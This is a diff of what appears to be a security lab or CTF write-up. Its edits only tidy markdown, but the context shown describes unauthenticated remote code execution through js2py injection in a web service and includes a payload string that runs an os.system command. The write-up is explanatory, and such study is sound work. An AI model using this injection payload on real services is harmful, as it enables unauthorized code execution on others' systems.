@@ -195,7 +195,7 @@ Sec-GPC: 1
 response
 
 
-```js
+```
 {
   "headers": [
     {
@@ -261,7 +261,7 @@ PORT     STATE SERVICE VERSION
 ```
 
 
-According with this [aritcle]("https://vulners.com/huntr/3FD606F7-83E1-4265-B083-2E1889A05E65") we can attack this service unauthenticated. we can inject arbitrary code abusing `js2py` funtionality due the lack of CSRF protection, a victim can be tricked to execute arbitrary python code.
+According with this https://vulners.com/huntr/3FD606F7-83E1-4265-B083-2E1889A05E65 we can attack this service unauthenticated. we can inject arbitrary code abusing `js2py` funtionality due the lack of CSRF protection, a victim can be tricked to execute arbitrary python code.
 
 
 so we can try to import a payload `pyimport os;os.system("touch /tmp/nice_job");f=function f2(){};;&package=xxx&crypted=AAAA&&passwords=aaaa'`
